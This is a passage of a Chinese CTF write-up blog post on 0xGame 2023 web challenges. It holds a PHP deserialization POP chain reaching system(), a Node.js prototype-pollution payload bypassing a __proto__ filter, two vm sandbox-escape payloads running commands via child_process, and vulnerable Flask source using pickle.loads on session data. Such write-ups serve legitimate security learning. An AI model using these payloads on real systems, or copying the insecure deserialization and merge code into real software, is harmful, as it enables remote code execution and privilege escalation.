class="hljs-variable">$expired</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$helper</span>;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Storage</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$store</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$funcs</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DataObject</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$storage</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;<br>&#125;<br><br><span class="hljs-variable">$cache1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cache</span>();<br><span class="hljs-variable">$cache2</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cache</span>();<br><span class="hljs-variable">$poc</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataObject</span>();<br><span class="hljs-variable">$poc</span>-&gt;storage = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Storage</span>();<br><span class="hljs-variable">$poc</span>-&gt;storage-&gt;store = &amp;<span class="hljs-variable">$cache2</span>-&gt;expired;<br><span class="hljs-variable">$cache2</span>-&gt;key = <span class="hljs-string">&#x27;php -r &quot;phpinfo();&quot;&#x27;</span>;<br><span class="hljs-variable">$poc</span>-&gt;data = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;key1&#x27;</span> =&gt; <span class="hljs-variable">$cache1</span>, <span class="hljs-string">&#x27;key2&#x27;</span> =&gt; <span class="hljs-variable">$cache2</span>);<br><span class="hljs-variable">$cache2</span>-&gt;helper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Helper</span>();<br><span class="hljs-variable">$cache2</span>-&gt;helper-&gt;funcs = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;clean&#x27;</span> =&gt; <span class="hljs-string">&#x27;system&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$poc</span>);<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
<p>这里在总结一波思路，首先new两个Cache对象，接着new一个DataObject对象，用于后续调用Storage.__set()方法，接着给其中的storage赋值为Storage对象，随后在将storage中的store属性与cache2的expired属性做一个引用。然后是将data属性赋值为含有两个元素的数组：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">这里呢先看data的第一个元素也就是cache1，其在foreach循环的第一次赋值时，调用了set魔术方法，这时候其中的store属性被赋值为空数组，接着由于cache1的expired属性为false，这时候是无法成功调用clean方法的，于是store数组此时被赋值为array(&#x27;key1&#x27;=&gt;$cache1)，总之此时store便不在是空了。但此时我们注意由于引用的存在，此时cache2的expired属性已经不可能为false了，紧接着在第二次foreach循环时，便可以成功调用cache2的clean方法<br></code></pre></td></tr></table></figure>
<p>接着我们将helper赋值为Helper对象，由于其中不存在clean方法，于是我们成功调用了其中的call魔术方法，并且字符串clean与key被当做call的参数，此时我们又可以将其中的funcs赋值为一个数组：<code>array('clean'=&gt;'system')</code>。其中的key为我们想要执行的恶意代码即可，这样在上述的组合下<code>$this-&gt;funcs[$name](...$args);</code>变为<code>$this-&gt;funcs['clean'](恶意代码);=&gt;system(恶意代码);</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;DataObject&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;storage&quot;</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;Storage&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;store&quot;</span>;N;&#125;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;data&quot;</span>;a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;key1&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Cache&quot;</span>:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;key&quot;</span>;N;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;value&quot;</span>;N;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;expired&quot;</span>;N;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;helper&quot;</span>;N;&#125;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;key2&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Cache&quot;</span>:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;key&quot;</span>;s:<span class="hljs-number">19</span>:<span class="hljs-string">&quot;php -r &quot;</span><span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-string">&quot;&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;value&quot;</span>;N;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;expired&quot;</span>;R:<span class="hljs-number">3</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;helper&quot;</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Helper&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;funcs&quot;</span>;a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;clean&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span>;&#125;&#125;&#125;&#125;&#125; <br></code></pre></td></tr></table></figure>
<p>输出如上，这里也是看别人wp知道flag被放在了环境变量中，这里它采用读取phpinfo的方法。但令我疑惑的是为何直接赋值为phpinfo()的话执行不了。。。</p>
<p>![image-20231023191959782](0xGame 2023/image-20231023191959782.png)</p>
<p>拿到flag</p>
<h2 id="Week-2-ez-sandbox"><a href="#Week-2-ez-sandbox" class="headerlink" title="Week-2-ez-sandbox"></a>[Week 2] ez_sandbox</h2>
<p>打开题目发现一个登录框，弱口令无果，扔给dirsearch扫目录，随后用bp抓一个登录包数据看看有何信息：</p>
<p>![image-20231026195758333](0xGame 2023/image-20231026195758333.png)</p>
<p>如上图是一个json数据块，其中包含用户名和密码，其次扫目录发现存在注册用户页面，看题目名称为沙箱，也没思路，于是看wp发现考察nodejs沙箱逃逸和原型链污染（懵逼了，这玩意儿没咋好好学，┭┮﹏┭┮）只能浑水摸鱼了，写完wp后就学！！！</p>
<p>代码在注册和登录的时候使⽤了 clone(req.body)</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">target, source</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) &#123;<br>        <span class="hljs-keyword">if</span> (key === <span class="hljs-string">&#x27;__proto__&#x27;</span>) &#123;<br>        <span class="hljs-keyword">continue</span><br>    &#125;<br>    <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;<br>        <span class="hljs-title function_">merge</span>(target[key], source[key])<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        target[key] = source[key]<br>    	&#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> target<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">clone</span>(<span class="hljs-params">source</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">merge</span>(&#123;&#125;, source)<br>&#125;<br></code></pre></td></tr></table></figure>
<p>根据⼀些参考⽂章, 很容易就可以知道这⾥存在原型链污染, 但是 <strong>proto</strong> 关键词被过滤了<br>
如果你对原型链这个概念稍微做⼀点深⼊了解, 就可以知道, 对于⼀个实例对象, 它的 <strong>proto</strong> 就等于<code>constructor.prototype</code>这样可以绕过proto关键词的过滤</p>
<p>先注册⼀个 test用户, 在登录时 POST 如下内容, 污染 admins 对象, 使得 username in admins 表达式的结果为True</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;test&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;test&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;constructor&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;prototype&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        	<span class="hljs-attr">&quot;test&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;123&quot;</span><br>		<span class="hljs-punctuation">&#125;</span><br>	<span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
<p>![image-20231026201904531](0xGame 2023/image-20231026201904531.png)</p>
<p>随后test 123登录进去发现成功得到admin用户权限</p>
<p>![image-20231026201951999](0xGame 2023/image-20231026201951999.png)</p>
<p>然后是⼀个简单的 vm 沙箱逃逸</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11859">https://xz.aliyun.com/t/11859</a></p>
<p>代码会 catch vm 沙箱执⾏时抛出的异常, 并访问异常的 message 属性</p>
<p>那么结合上面的文章, 可以通过 throw 抛出对象的思路, 拿到 arguments.callee.caller (指向</p>
<p>当前函数的调用者), 然后拿到沙箱外的 process 对象, 最终实现 RCE</p>
<p>waf 函数有⼀些简单的关键词过滤, 不过因为 Javascript 语言本身非常灵活, 所以可以使用中</p>
<p>括号 + 字符串拼接的形式绕过</p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/237032">https://www.anquanke.com/post/id/237032</a></p>
<p>下面两种方式都行</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-comment">// method 1</span><br>throw new Proxy(<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">&#123;</span> <span class="hljs-comment">// Proxy 对象⽤于创建对某⼀对象的代理, 以实现属性和⽅法的拦截</span><br>    get<span class="hljs-punctuation">:</span> function()<span class="hljs-punctuation">&#123;</span> <span class="hljs-comment">// 访问这个对象的任意⼀个属性都会执⾏ get 指向的函数</span><br>        const c = arguments.callee.caller<br>        const p = (c<span class="hljs-punctuation">[</span>&#x27;constru&#x27;+&#x27;ctor&#x27;<span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span>&#x27;constru&#x27;+&#x27;ctor&#x27;<span class="hljs-punctuation">]</span>(&#x27;return pro&#x27;+&#x27;cess&#x27;))()<br>        return p<span class="hljs-punctuation">[</span>&#x27;mainM&#x27;+&#x27;odule&#x27;<span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span>&#x27;requi&#x27;+&#x27;re&#x27;<span class="hljs-punctuation">]</span>(&#x27;child_pr&#x27;+&#x27;ocess&#x27;)<span class="hljs-punctuation">[</span>&#x27;ex&#x27;+&#x27;ecSync&#x27;<span class="hljs-punctuation">]</span>(&#x27;cat /flag&#x27;).toString();<br>	<span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span>)<br><br><span class="hljs-comment">// method 2</span><br>let obj = <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span> <span class="hljs-comment">// 针对该对象的 message 属性定义⼀个 getter, 当访问 obj.message 时会调⽤对应的函数</span><br>obj.__defineGetter__(&#x27;message&#x27;<span class="hljs-punctuation">,</span> function()<span class="hljs-punctuation">&#123;</span><br>    const c = arguments.callee.caller<br>    const p = (c<span class="hljs-punctuation">[</span>&#x27;constru&#x27;+&#x27;ctor&#x27;<span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span>&#x27;constru&#x27;+&#x27;ctor&#x27;<span class="hljs-punctuation">]</span>(&#x27;return pro&#x27;+&#x27;cess&#x27;))()<br>    return p<span class="hljs-punctuation">[</span>&#x27;mainM&#x27;+&#x27;odule&#x27;<span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span>&#x27;requi&#x27;+&#x27;re&#x27;<span class="hljs-punctuation">]</span>(&#x27;child_pr&#x27;+&#x27;ocess&#x27;)<span class="hljs-punctuation">[</span>&#x27;ex&#x27;+&#x27;ecSync&#x27;<span class="hljs-punctuation">]</span>(&#x27;cat /flag&#x27;).toString();<br><span class="hljs-punctuation">&#125;</span>)<br>throw obj<br></code></pre></td></tr></table></figure>
<p>![image-20231026202002001](0xGame 2023/image-20231026202002001.png)</p>
<p>拿到flag（等我深入学习一波再回来思考</p>
<h2 id="Week-3-notebook"><a href="#Week-3-notebook" class="headerlink" title="Week-3-notebook"></a>[Week 3] notebook</h2>
<p>![image-20231026203700101](0xGame 2023/image-20231026203700101.png)</p>
<p>打开题目是一个笔记本 ？？？,这里测试了一番发现不是xss等漏洞，搜目录也没有信息，根据题目提示说是该项目由flask框架搭建。之后看了wp发现考察的是session伪构造，pickle反序列化，反弹shell</p>
<p>题目源码如下：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template, session<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> os<br><br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = os.urandom(<span class="hljs-number">2</span>).<span class="hljs-built_in">hex</span>()<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Note</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, content</span>):<br>        self._name = name<br>        self._content = content<br><br><span class="hljs-meta">    @property</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">name</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> self._name<br>    <br><span class="hljs-meta">    @property</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">content</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> self._content<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&lt;path:note_id&gt;&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">view_note</span>(<span class="hljs-params">note_id</span>):<br>    notes = session.get(<span class="hljs-string">&#x27;notes&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> notes:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;note.html&#x27;</span>, msg=<span class="hljs-string">&#x27;You have no notes&#x27;</span>)<br>    <br>    note_raw = notes.get(note_id)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> note_raw:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;note.html&#x27;</span>, msg=<span class="hljs-string">&#x27;This note does not exist&#x27;</span>)<br>    <br>    note = pickle.loads(note_raw)<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;note.html&#x27;</span>, note_id=note_id, note_name=note.name, note_content=note.content)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/add_note&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_note</span>():<br>    note_name = request.form.get(<span class="hljs-string">&#x27;note_name&#x27;</span>)<br>    note_content = request.form.get(<span class="hljs-string">&#x27;note_content&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> note_name == <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">or</span> note_content == <span class="hljs-string">&#x27;&#x27;</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, status=<span class="hljs-string">&#x27;add_failed&#x27;</span>, msg=<span class="hljs-string">&#x27;note name or content is empty&#x27;</span>)<br>    <br>    note_id = <span class="hljs-built_in">str</span>(uuid.uuid4())<br>    note = Note(note_name, note_content)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session.get(<span class="hljs-string">&#x27;notes&#x27;</span>):<br>        session[<span class="hljs-string">&#x27;notes&#x27;</span>] = &#123;&#125;<br>    <br>    notes = session[<span class="hljs-string">&#x27;notes&#x27;</span>]<br>    notes[note_id] = pickle.dumps(note)<br>    session[<span class="hljs-string">&#x27;notes&#x27;</span>] = notes<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, status=<span class="hljs-string">&#x27;add_success&#x27;</span>, note_id=note_id)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/delete_note&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete_note</span>():<br>    note_id = request.form.get(<span class="hljs-string">&#x27;note_id&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> note_id:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br>    <br>    notes = session.get(<span class="hljs-string">&#x27;notes&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> notes:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, status=<span class="hljs-string">&#x27;delete_failed&#x27;</span>, msg=<span class="hljs-string">&#x27;You have no notes&#x27;</span>)<br>    <br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> notes.get(note_id):<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, status=<span class="hljs-string">&#x27;delete_failed&#x27;</span>, msg=<span class="hljs-string">&#x27;This note does not exist&#x27;</span>)<br>    <br>    <span class="hljs-keyword">del</span> notes[note_id]<br>    session[<span class="hljs-string">&#x27;notes&#x27;</span>] = notes<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, status=<span class="hljs-string">&#x27;delete_success&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8000</span>, debug=<span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure>
<h1>0x02 参考文章</h1>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_56426046/article/details/127264705?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=is_numeric%E7%BB%95%E8%BF%87&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-127264705.142%5Ev96%5Epc_search_result_base4&amp;spm=1018.2226.3001.4187">php is_numeric函数的绕过</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/huangyongkang666/article/details/123880442?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169796116116800227493577%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169796116116800227493577&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-3-123880442-null-null.142%5Ev96%5Epc_search_result_base4&amp;utm_term=is_numeric%E7%BB%95%E8%BF%87&amp;spm=1018.2226.3001.4187">常见php函数绕过</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_51183537/article/details/121140942?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=is_numeric%E7%BB%95%E8%BF%87&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-6-121140942.142%5Ev96%5Epc_search_result_base4&amp;spm=1018.2226.3001.4187">[CTF]php is_numeric与弱等于(==)绕过</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_50854662/article/details/125738844?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=git%E6%B3%84%E9%9C%B2%E5%88%A9%E7%94%A8&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-9-125738844.142%5Ev96%5Epc_search_result_base4&amp;spm=1018.2226.3001.4187">常见的Web源码泄漏漏洞</a></p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/10/26/%E6%B5%85%E6%9E%90%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93/">← Next 深度学习文件上传-二次渲染</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/10/16/php%E6%97%A0%E5%8F%82%E6%95%B0RCE/">php无参数RCE Prev →</a></div></div></div><div id="comments"><div id="waline"></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">hybcx</a></h1><div id="description"><p></p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">0x01 前言</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Week-1-signin"><span class="toc-number">1.1.</span> <span class="toc-text">[Week 1] signin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week-1-baby-php"><span class="toc-number">1.2.</span> <span class="toc-text">[Week 1] baby_php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week-1-hello-http"><span class="toc-number">1.3.</span> <span class="toc-text">[Week 1] hello_http</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week-1-repo-leak"><span class="toc-number">1.4.</span> <span class="toc-text">[Week 1] repo_leak</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week-1-ping"><span class="toc-number">1.5.</span> <span class="toc-text">[Week 1] ping</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week-2-ez-sqli"><span class="toc-number">1.6.</span> <span class="toc-text">[Week 2] ez_sqli</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week-2-ez-upload"><span class="toc-number">1.7.</span> <span class="toc-text">[Week 2] ez_upload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week-2-ez-unserialize"><span class="toc-number">1.8.</span> <span class="toc-text">[Week 2] ez_unserialize</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week-2-ez-sandbox"><span class="toc-number">1.9.</span> <span class="toc-text">[Week 2] ez_sandbox</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week-3-notebook"><span class="toc-number">1.10.</span> <span class="toc-text">[Week 3] notebook</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">0x02 参考文章</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script type="module">import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';
window.waline = init;
</script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {if (document.querySelector('#waline'))
 waline({
   el: '#waline',
   dark: ':root[theme-mode="dark"]',
   serverURL: 'https://waline-blog-iwqdtxise-hybchenxing.vercel.app',
   path: window.location.pathname,
 });document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>